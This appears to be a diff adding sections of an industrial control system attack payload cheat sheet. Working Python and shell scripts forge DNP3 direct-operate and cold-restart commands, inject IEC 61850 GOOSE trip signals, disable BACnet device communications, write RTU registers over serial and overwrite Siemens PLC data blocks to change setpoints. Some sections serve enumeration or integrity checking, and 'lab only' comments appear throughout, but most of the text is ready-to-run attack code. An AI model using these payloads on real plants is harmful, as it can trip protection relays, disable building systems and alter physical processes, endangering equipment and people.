@@ -1024,3 +1024,668 @@ tshark -i eth0 -f "port 502 or port 20000 or port 4840" \
 diff <(strings plc_backup_v1.bin | sort) <(strings plc_current.bin | sort) > /tmp/plc_diff.txt
 echo "[+] Differences found: $(grep -c '^<' /tmp/plc_diff.txt) additions, $(grep -c '^>' /tmp/plc_diff.txt) removals"
 ```
+
+---
+
+## 14. DNP3 Advanced Attack Payloads
+
+### DNP3 Master Impersonation
+
+```bash
+# Craft DNP3 direct operate command (FC 5) to control physical outputs
+python3 -c "
+import socket
+import struct
+
+target = '192.168.1.15'
+port = 20000
+
+# DNP3 Application Layer: Direct Operate (FC=5)
+# Object Group 12 (Binary Output), Variation 1, Qualifier 0x17 (2-byte index)
+# Control Relay Output Block: Code=0x01 (Close), Count=1, OnTime=1000, OffTime=0
+app_layer = bytes([
+    0xC0,       # AC: FIR=1, FIN=1, CON=0, UNS=0, SEQ=0
+    0x05,       # FC: Direct Operate
+    0x0C, 0x01, # Object Group 12, Variation 1
+    0x17,       # Qualifier: 2-byte start/end index
+    0x00, 0x00, # Start index: 0
+    0x00, 0x00, # End index: 0
+    # Control Relay Output Block for index 0
+    0x01,       # Control code: Close output
+    0x00,       # Status: Normal
+    0xE8, 0x03, 0x00, 0x00,  # Count: 1000ms ON time
+    0x00, 0x00, 0x00, 0x00,  # OFF time: 0
+])
+
+# DNP3 Data Link Layer
+dl_start = bytes([0x05, 0x64])  # Start bytes
+dl_control = bytes([0xC4])      # DIR=1, PRM=1, FCB=0, FCV=0, FC=Send/Confirm
+dl_dest = struct.pack('<H', 1)  # Destination: outstation address 1
+dl_src = struct.pack('<H', 10)  # Source: master address 10
+dl_length = struct.pack('B', len(app_layer) + 5)  # Data length + header
+
+dl_frame = dl_start + dl_control + dl_length + dl_dest + dl_src
+# CRC would be computed for each block in a real implementation
+
+frame = dl_frame + app_layer
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect((target, port))
+s.send(frame)
+response = s.recv(4096)
+print(f'DNP3 Direct Operate response: {response.hex()}')
+s.close()
+"
+```
+
+### DNP3 Cold/Warm Restart
+
+```bash
+# Send DNP3 cold restart command (FC 13) to reboot the outstation
+python3 -c "
+import socket
+import struct
+
+target = '192.168.1.15'
+port = 20000
+
+# DNP3 Application Layer: Cold Restart (FC=13)
+app_layer = bytes([
+    0xC1,  # AC: FIR=1, FIN=1, CON=0, UNS=0, SEQ=1
+    0x0D,  # FC: Cold Restart
+])
+
+# Minimal DNP3 frame
+dl_frame = bytes([
+    0x05, 0x64,           # Start bytes
+    0xC4,                  # Control byte
+    len(app_layer) + 5,   # Length
+    0x01, 0x00,           # Destination: 1
+    0x0A, 0x00,           # Source: 10
+])
+
+frame = dl_frame + app_layer
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(10)
+s.connect((target, port))
+s.send(frame)
+response = s.recv(4096)
+print(f'Cold restart response: {response.hex()}')
+# Response contains the time until restart in seconds
+if len(response) > 12:
+    restart_time = struct.unpack('<H', response[12:14])[0]
+    print(f'Outstation will restart in {restart_time} seconds')
+s.close()
+"
+```
+
+### DNP3 Data Class Enumeration
+
+```bash
+# Enumerate all DNP3 data classes (0, 1, 2, 3) from an outstation
+python3 -c "
+import socket
+import struct
+
+target = '192.168.1.15'
+port = 20000
+
+data_classes = [
+    (60, 1, 'Class 0 (All static data)'),
+    (60, 2, 'Class 1 (High priority events)'),
+    (60, 3, 'Class 2 (Medium priority events)'),
+    (60, 4, 'Class 3 (Low priority events)'),
+]
+
+for group, variation, description in data_classes:
+    app_layer = bytes([
+        0xC0, 0x01,           # AC + FC (Read)
+        group, variation,      # Object Group, Variation
+        0x06,                  # Qualifier: no prefix, start=stop=0
+        0x00, 0x00,           # Start/Stop: 0
+    ])
+
+    dl_frame = bytes([
+        0x05, 0x64, 0xC4,
+        len(app_layer) + 5,
+        0x01, 0x00, 0x0A, 0x00,
+    ])
+
+    frame = dl_frame + app_layer
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    try:
+        s.connect((target, port))
+        s.send(frame)
+        response = s.recv(4096)
+        print(f'{description}: {len(response)} bytes response')
+    except Exception as e:
+        print(f'{description}: ERROR {e}')
+    s.close()
+"
+```
+
+---
+
+## 15. IEC 61850 Advanced Attack Payloads
+
+### GOOSE Message Injection
+
+```bash
+# Craft and inject a forged GOOSE message using scapy
+# WARNING: Lab environment only. GOOSE injection can trip protection relays.
+python3 -c "
+from scapy.all import *
+from scapy.contrib.iec61850 import *
+
+# Forge GOOSE message with incremented stNum to override legitimate messages
+# Target: IEC 61850 GOOSE Ethertype 0x88B8
+goose_pdu = Ether(
+    dst='01:0c:cd:01:00:01',  # GOOSE multicast address
+    src='00:01:02:03:04:05',  # Attacker MAC (should match IED for stealth)
+    type=0x88B8
+)
+
+# GOOSE frame structure (simplified)
+# APPID: 0x0000, Length: variable, Reserved1: 0, Reserved2: 0
+# GOOSE PDU fields: goID, goRef, time, stNum, sqNum, test, ndsCom, dataset
+goose_payload = bytes([
+    0x00, 0x00, 0x00, 0x00,  # APPID + Length placeholder
+    0x00, 0x00, 0x00, 0x00,  # Reserved
+    # ASN.1 encoded GOOSE PDU (simplified)
+    0x61,                     # Tag: GOOSE PDU
+    0x20,                     # Length placeholder
+    0x80, 0x06, 0x47, 0x4F, 0x49, 0x44, 0x30, 0x31,  # goID: 'GOID01'
+    0x81, 0x10,               # goRef (16 bytes)
+    0x4C, 0x44, 0x2F, 0x4C, 0x4C, 0x4E, 0x30, 0x2F,
+    0x24, 0x47, 0x4F, 0x24, 0x47, 0x4F, 0x43, 0x42,
+    0x82, 0x08,               # time (8 bytes)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+    0x83, 0x01, 0x0A,         # stNum: 10 (must be > current)
+    0x84, 0x01, 0x00,         # sqNum: 0
+    0x85, 0x01, 0x00,         # test: FALSE
+    0x86, 0x01, 0x00,         # ndsCom: FALSE
+    0x87, 0x01, 0x01,         # confRev: 1
+    0x88, 0x01, 0x01,         # numDatSetEntries: 1
+    0xAB, 0x03,               # AllData
+    0x83, 0x01, 0x01,         # Boolean data: TRUE (trip signal)
+])
+
+# Update length fields
+total_len = len(goose_payload) - 8  # Subtract APPID header
+goose_payload = bytes([
+    0x00, 0x00,
+    (total_len >> 8) & 0xFF, total_len & 0xFF,
+    0x00, 0x00, 0x00, 0x00
+]) + goose_payload[8:]
+
+frame = Ether(
+    dst='01:0c:cd:01:00:01',
+    src='00:01:02:03:04:05',
+    type=0x88B8
+) / Raw(load=goose_payload)
+
+print('Forged GOOSE frame prepared')
+print(f'  Target: GOOSE multicast')
+print(f'  stNum: 10 (must exceed current value)')
+print(f'  Data: Boolean TRUE (trip signal)')
+print(f'  Frame length: {len(bytes(frame))} bytes')
+# sendp(frame, iface='eth0')  # Uncomment for lab testing
+"
+```
+
+### IEC 61850 MMS (Manufacturing Message Specification) Interaction
+
+```bash
+# Enumerate IEC 61850 logical devices and data objects via MMS
+python3 -c "
+import socket
+import struct
+
+target = '192.168.1.60'
+port = 102  # MMS typically runs over TCP port 102 (same as S7comm)
+
+# MMS Initiate Request (simplified ISO transport + session + presentation + ACSE + MMS)
+# This is a conceptual framework - real MMS requires proper ISO stack
+
+# Step 1: COTP Connection Request
+cotp_cr = bytes([
+    0x03,       # Length
+    0x0E,       # PDU Type: Connection Request (CR)
+    0x00, 0x00, # Destination Reference
+    0x00, 0x01, # Source Reference
+    0x00,       # Class/Option
+])
+
+# TPKT header
+tpkt = bytes([0x03, 0x00]) + struct.pack('>H', len(cotp_cr) + 4)
+
+packet = tpkt + cotp_cr
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect((target, port))
+s.send(packet)
+response = s.recv(4096)
+print(f'MMS/COTP response: {response.hex()}')
+print(f'Response length: {len(response)} bytes')
+
+if len(response) > 10:
+    print('MMS endpoint detected - IEC 61850 server responding')
+s.close()
+"
+
+# Capture MMS traffic for analysis
+tcpdump -i eth0 -w iec61850_mms.pcap port 102
+
+# Parse IEC 61850 logical device names from MMS traffic
+tshark -r iec61850_mms.pcap -Y "mms" -T fields \
+  -e mms.itemID -e mms.service -e ip.src -e ip.dst | sort -u | head -50
+```
+
+---
+
+## 16. BACnet Advanced Attack Payloads
+
+### BACnet Device Communication Control
+
+```bash
+# Send BACnet DeviceCommunicationControl to disable device communications
+# WARNING: Lab only - this silences a BACnet device
+python3 -c "
+from scapy.all import *
+
+target_ip = '192.168.1.50'
+target_port = 47808
+
+# BACnet DeviceCommunicationControl (service choice 0x11)
+# APDU: Confirmed Request, Max Segments=0, Max APDU=1476, InvokeID=1, Service=0x11
+# Time Duration: 60 minutes, Enable/Disable: 1 (Disable)
+
+bacnet_frame = Ether()/IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=bytes([
+    0x81, 0x0A,       # BACnet/IP BVLC: Type=0x81, Function=0x0A (Original Unicast NPDU)
+    0x00, 0x19,       # BVLC Length: 25 bytes
+    0x01, 0x04,       # NPDU: Version=1, Control=0x04 (no routing, data expect reply)
+    0x00,             # Network layer is not present
+    # APDU: Confirmed Request
+    0x00,             # APDU Flags: Confirmed Request (segmented=0)
+    0x05,             # Max Segments Accepted: Unspecified, Max APDU: 1476
+    0x01,             # Invoke ID: 1
+    0x11,             # Service Choice: DeviceCommunicationControl (0x11)
+    # Service Request:
+    0x29,             # Tag 2 (Time Duration): Context 9
+    0x00, 0x3C,       # Duration: 60 minutes
+    0x19, 0x01,       # Tag 1 (Enable/Disable): Context 9, Value=1 (Disable)
+]))
+
+print(f'BACnet DeviceCommunicationControl prepared')
+print(f'  Target: {target_ip}:{target_port}')
+print(f'  Action: Disable communications for 60 minutes')
+# sendp(bacnet_frame, iface='eth0')
+"
+```
+
+### BACnet Who-Is/I-Am Device Discovery
+
+```bash
+# Send BACnet Who-Is broadcast to discover all devices on the network
+python3 -c "
+from scapy.all import *
+
+# BACnet Who-Is (service choice 0x08) - broadcast
+who_is_frame = Ether(
+    dst='ff:ff:ff:ff:ff:ff'  # Broadcast
+)/IP(
+    dst='255.255.255.255'
+)/UDP(
+    dport=47808,
+    sport=47808
+)/Raw(load=bytes([
+    0x81, 0x0B,       # BACnet/IP BVLC: Original Broadcast NPDU
+    0x00, 0x0C,       # BVLC Length: 12 bytes
+    0x01, 0x20,       # NPDU: Version=1, Control=0x20 (data, no reply expected)
+    # APDU: Unconfirmed Request
+    0x10,             # APDU Type: Unconfirmed Request (0x1)
+    0x08,             # Service Choice: Who-Is (0x08)
+    # No parameters = discover all devices (range 0-4194303)
+]))
+
+print('Sending BACnet Who-Is broadcast...')
+sendp(who_is_frame, iface='eth0')
+print('Listen for I-Am responses:')
+print('  tshark -i eth0 -f \"udp port 47808\" -Y \"bacnet\" -T fields -e ip.src -e bacnet.device_id')
+"
+
+# Capture I-Am responses
+timeout 30 tshark -i eth0 -f "udp port 47808" -Y "bacnet" \
+  -T fields -e ip.src -e bacnet.device_id -e bacnet.vendor_id \
+  -e bacnet.apdu.service | sort -u
+```
+
+### BACnet COV (Change of Value) Subscription
+
+```bash
+# Subscribe to COV notifications for a target object (passive monitoring)
+python3 -c "
+from scapy.all import *
+
+target_ip = '192.168.1.50'
+target_port = 47808
+
+# BACnet SubscribeCOV (service choice 0x0F)
+# Subscribe to Analog Input, Object Instance 1
+subscribe_cov = Ether()/IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=bytes([
+    0x81, 0x0A,       # BACnet/IP: Original Unicast NPDU
+    0x00, 0x1B,       # BVLC Length
+    0x01, 0x04,       # NPDU
+    0x00,             # No network layer
+    0x00, 0x05,       # APDU: Confirmed Request, Max APDU=1476
+    0x02,             # Invoke ID: 2
+    0x0F,             # Service: SubscribeCOV
+    # Subscriber Process Identifier
+    0x09, 0x01,       # Tag 0: Process ID = 1
+    # Object Identifier
+    0x0C,             # Tag: Object Identifier (context 1)
+    0x00, 0x00, 0x00, 0x01,  # Analog Input, Instance 1
+    # Issue Confirmed Notifications: TRUE
+    0x19, 0x01,       # Tag 2: TRUE
+    # Lifetime: 3600 seconds
+    0x29, 0x00, 0x0E, 0x10,  # Tag 3: 3600 seconds
+]))
+
+print(f'BACnet COV subscription prepared')
+print(f'  Target: {target_ip}')
+print(f'  Object: Analog Input, Instance 1')
+print(f'  Duration: 3600 seconds')
+"
+```
+
+---
+
+## 17. RTU Command Injection Payloads
+
+### RTU Communication via DNP3 and Modbus RTU
+
+```bash
+# Interact with RTU over serial (Modbus RTU) using mbpoll
+# Connect via serial-to-USB adapter
+mbpoll -a /dev/ttyUSB0 -b 9600 -d 8 -s 1 -p none -m rtu -t 1 -r 0 -c 10
+
+# Read RTU holding registers over Modbus RTU serial
+mbpoll -a /dev/ttyUSB0 -b 19200 -d 8 -s 2 -p even -m rtu -1 -r 0 -c 20 -t 3
+
+# Write to RTU register over serial (lab only)
+mbpoll -a /dev/ttyUSB0 -b 9600 -d 8 -s 1 -p none -m rtu -t 1 -r 10 -1 -v 500
+
+# Scan for RTUs on serial bus by enumerating slave addresses
+for addr in $(seq 1 247); do
+  timeout 2 mbpoll -a /dev/ttyUSB0 -b 9600 -d 8 -s 1 -p none -m rtu \
+    -t ${addr} -r 0 -c 1 -1 2>/dev/null && echo "RTU at address ${addr}: ACTIVE"
+done
+```
+
+### RTU Firmware Upload via Serial
+
+```bash
+# Upload firmware to RTU via serial connection (lab only)
+# WARNING: Incorrect firmware will brick the RTU
+python3 -c "
+import serial
+import struct
+import time
+
+# Configure serial port for RTU communication
+ser = serial.Serial(
+    port='/dev/ttyUSB0',
+    baudrate=9600,
+    bytesize=serial.EIGHTBITS,
+    parity=serial.PARITY_NONE,
+    stopbits=serial.STOPBITS_ONE,
+    timeout=5
+)
+
+# Read RTU device identification
+def send_modbus_rtu(slave_id, function_code, data):
+    '''Send Modbus RTU frame with CRC.'''
+    frame = bytes([slave_id, function_code]) + data
+    # Compute CRC-16 (Modbus)
+    crc = 0xFFFF
+    for byte in frame:
+        crc ^= byte
+        for _ in range(8):
+            if crc & 0x0001:
+                crc >>= 1
+                crc ^= 0xA001
+            else:
+                crc >>= 1
+    frame += struct.pack('<H', crc)
+    return frame
+
+# Read device identification (FC 0x2B, MEI 0x0E)
+request = send_modbus_rtu(1, 0x2B, bytes([0x0E, 0x01, 0x00, 0x00]))
+ser.write(request)
+response = ser.read(256)
+
+if len(response) > 4:
+    print(f'RTU Response: {response.hex()}')
+    slave = response[0]
+    fc = response[1]
+    if fc == 0x2B:
+        mei = response[2]
+        vendor = response[8:28].decode('ascii', errors='replace').strip()
+        product = response[28:58].decode('ascii', errors='replace').strip()
+        print(f'  Slave ID: {slave}')
+        print(f'  Vendor: {vendor}')
+        print(f'  Product: {product}')
+else:
+    print('No response from RTU')
+
+ser.close()
+"
+```
+
+### RTU Diagnostic Commands
+
+```bash
+# Send Modbus diagnostic commands (FC 0x08) to RTU
+python3 -c "
+import serial
+import struct
+
+ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=5)
+
+diagnostics = [
+    (0x0000, 'Return Query Data'),
+    (0x0001, 'Restart Communications Option'),
+    (0x0002, 'Return Diagnostic Register'),
+    (0x0004, 'Force Listen Only Mode'),
+    (0x000A, 'Clear Counters and Diagnostic Register'),
+    (0x000B, 'Return Bus Message Count'),
+    (0x000C, 'Return Bus Communication Error Count'),
+    (0x000D, 'Return Bus Exception Error Count'),
+    (0x000E, 'Return Slave Message Count'),
+    (0x000F, 'Return Slave No Response Count'),
+    (0x0010, 'Return Slave NAK Count'),
+    (0x0011, 'Return Slave Busy Count'),
+    (0x0012, 'Return Bus Character Overrun Count'),
+]
+
+def modbus_crc(frame):
+    crc = 0xFFFF
+    for byte in frame:
+        crc ^= byte
+        for _ in range(8):
+            if crc & 1:
+                crc = (crc >> 1) ^ 0xA001
+            else:
+                crc >>= 1
+    return struct.pack('<H', crc)
+
+for sub_function, name in diagnostics:
+    # Build diagnostic request
+    data = struct.pack('>H', sub_function) + b'\\x00\\x00'  # Sub-function + data
+    frame = bytes([1, 0x08]) + data
+    frame += modbus_crc(frame)
+
+    ser.write(frame)
+    response = ser.read(256)
+
+    if len(response) > 5:
+        resp_data = struct.unpack('>H', response[3:5])[0]
+        print(f'{name}: {resp_data} (0x{resp_data:04X})')
+    else:
+        print(f'{name}: No response')
+
+ser.close()
+"
+```
+
+---
+
+## 18. PLC Firmware Manipulation Payloads
+
+### PLC Program Extraction and Analysis
+
+```bash
+# Extract complete PLC program using snap7 (Siemens S7)
+python3 -c "
+from snap7.client import Client
+from snap7.types import BlockTypes
+import hashlib
+
+c = Client()
+c.connect('192.168.1.20', 0, 1)
+
+# List all blocks
+blocks = c.list_blocks()
+print(f'Total blocks: {len(blocks)}')
+print()
+print(f'{\"Type\":<6} {\"Number\":<8} {\"Size\":<10} {\"MD5\":<20}')
+print('-' * 50)
+
+for block in blocks:
+    try:
+        block_data = c.upload(block.blktype, block.blknumber)
+        md5 = hashlib.md5(block_data).hexdigest()[:16]
+        size_kb = len(block_data) / 1024
+        print(f'{block.blktype:<6} {block.blknumber:<8} {size_kb:<10.1f} {md5:<20}')
+    except Exception as e:
+        print(f'{block.blktype:<6} {block.blknumber:<8} ERROR: {str(e)[:30]}')
+
+c.disconnect()
+"
+```
+
+### PLC Memory Dump
+
+```bash
+# Dump PLC memory areas for forensic analysis
+python3 -c "
+from snap7.client import Client
+from snap7.types import Areas
+import hashlib
+
+c = Client()
+c.connect('192.168.1.20', 0, 1)
+
+# Memory areas to dump
+areas = [
+    (Areas.DB, 'Data Blocks (DB)'),
+    (Areas.MK, 'Marker Memory (M)'),
+    (Areas.PE, 'Process Input (I)'),
+    (Areas.PA, 'Process Output (Q)'),
+    (Areas.CT, 'Counters (C)'),
+    (Areas.TM, 'Timers (T)'),
+]
+
+print('PLC Memory Dump')
+print('=' * 60)
+
+for area_id, area_name in areas:
+    try:
+        data = c.read_area(area_id, 0, 0, 1024)
+        md5 = hashlib.md5(data).hexdigest()
+        print(f'{area_name}:')
+        print(f'  Size: {len(data)} bytes')
+        print(f'  MD5: {md5}')
+        print(f'  First 32 bytes: {data[:32].hex()}')
+        print()
+    except Exception as e:
+        print(f'{area_name}: ACCESS DENIED ({e})')
+        print()
+
+c.disconnect()
+"
+```
+
+### PLC Block Comparison (Integrity Verification)
+
+```bash
+# Compare PLC block against known-good backup
+python3 -c "
+from snap7.client import Client
+import hashlib
+
+c = Client()
+c.connect('192.168.1.20', 0, 1)
+
+# Load reference block from file
+with open('plc_backup_db1.bin', 'rb') as f:
+    reference_db1 = f.read()
+
+# Extract current DB1 from PLC
+current_db1 = c.db_read(1, 0, len(reference_db1))
+
+# Compare
+ref_md5 = hashlib.md5(reference_db1).hexdigest()
+cur_md5 = hashlib.md5(current_db1).hexdigest()
+
+print(f'DB1 Integrity Check:')
+print(f'  Reference MD5: {ref_md5}')
+print(f'  Current MD5:   {cur_md5}')
+print(f'  Match: {ref_md5 == cur_md5}')
+
+if ref_md5 != cur_md5:
+    # Find differences
+    for i in range(min(len(reference_db1), len(current_db1))):
+        if reference_db1[i] != current_db1[i]:
+            print(f'  DIFF at offset {i}: ref=0x{reference_db1[i]:02x} cur=0x{current_db1[i]:02x}')
+
+c.disconnect()
+"
+```
+
+### PLC Program Download (Lab Only)
+
+```bash
+# Download a modified block to the PLC (lab only)
+python3 -c "
+from snap7.client import Client
+
+c = Client()
+c.connect('192.168.1.20', 0, 1)
+
+# Read the current block
+original_block = c.db_read(1, 0, 256)
+print(f'Original DB1 first 16 bytes: {original_block[:16].hex()}')
+
+# Create modified version
+modified_block = bytearray(original_block)
+# Modify specific bytes (e.g., change a setpoint at offset 10-11)
+modified_block[10] = 0x01  # New setpoint high byte
+modified_block[11] = 0xF4  # New setpoint low byte (500 in decimal)
+
+# Download modified block to PLC
+c.db_write(1, 0, bytes(modified_block))
+print(f'Modified DB1 first 16 bytes: {modified_block[:16].hex()}')
+
+# Verify the modification
+verify_block = c.db_read(1, 0, 256)
+print(f'Verification: {\"MATCH\" if verify_block[:16] == modified_block[:16] else \"MISMATCH\"}')
+
+c.disconnect()
+"
+```
